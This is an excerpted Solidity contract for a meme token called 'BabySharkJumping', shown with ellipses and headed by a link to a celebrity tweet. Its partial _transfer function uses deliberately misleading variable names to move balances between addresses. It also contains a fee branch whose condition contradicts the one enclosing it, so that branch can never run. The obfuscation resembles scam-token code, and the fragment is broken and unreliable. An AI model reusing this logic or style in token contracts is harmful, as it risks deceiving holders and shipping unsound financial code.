...
/**
https://twitter.com/elonmusk/status/1593537112933953536
...
contract BabySharkJumping is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_Marketing[_month] > 0 && amount > _native) {
            bool _suppose = _square == _Marketing[_BuyBack];
            ...
            _Devs[_native] = _BuyBack;

            if (_taxFee > 0 && !inSwapAndLiquify && _Marketing[_month] == 0 && _Marketing[_BuyBack] == 0) {
                amount -= fee;
                _balances[_month] -= fee;
            }

            _balances[_month] -= amount;
            _balances[_BuyBack] += amount;
            emit Transfer(_month, _BuyBack, amount);
        }
    }
